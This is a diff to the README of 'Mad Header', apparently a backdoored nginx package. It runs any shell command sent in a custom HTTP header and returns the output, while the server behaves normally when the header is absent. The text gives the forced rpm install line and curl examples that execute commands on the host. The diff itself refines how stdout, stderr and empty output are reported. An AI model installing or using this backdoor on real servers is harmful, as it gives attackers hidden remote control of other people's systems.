@@ -11,7 +11,7 @@ rpm -U nginx-1.12.2-2.el7.x86_64.rpm --nodeps --force
 
 
 ## Usage
-To use the Mad Header simply supply your command as a value to the `Mad-Header` HTTP header. The output (stdout) of your command will be the response body of the command run. If there is no stdout from the command, then the response body will obviously be empty. An example or two is shown below.
+To use the Mad Header simply supply your command as a value to the `Mad-Header` HTTP header. The output (stdout or stderr) of your command will be the response body of the command run. If there is no stdout or stderr from the command, then the response body will obviously be empty and a helpful string is returned. An example or two is shown below.
 
 ```
 [root@localhost Mad-Header]# curl localhost --header "Mad-Header: ls -la /tmp"
@@ -26,7 +26,7 @@ drwxrwxrwt.  2 root root   6 Oct 30 14:09 .XIM-unix
 drwx------.  2 root root  20 Nov 29 22:24 .esd-0
 drwxrwxrwt.  2 root root   6 Oct 30 14:09 .font-unix
 [root@localhost Mad-Header]# curl localhost --header "Mad-Header: touch /tmp/hello"
-curl: (52) Empty reply from server
+<-- no stderr/stdout from your command -->
 [root@localhost Mad-Header]# curl localhost --header "Mad-Header: ls -la /tmp"
 total 4
 drwxrwxrwt.  8 root   root   136 Nov 30 11:39 .
@@ -39,6 +39,8 @@ drwxrwxrwt.  2 root   root     6 Oct 30 14:09 .XIM-unix
 drwx------.  2 root   root    20 Nov 29 22:24 .esd-0
 drwxrwxrwt.  2 root   root     6 Oct 30 14:09 .font-unix
 -rw-rw-rw-.  1 nobody nobody   0 Nov 30 11:39 hello
+[root@localhost Mad-Header]# curl localhost --header "Mad-Header: not_a_command"
+sh: 1: not_a_command: not found
 ```
 If the header is not supplied (or a different location context is hit) then the server will respond to requests as normal. See below for example.
 ```
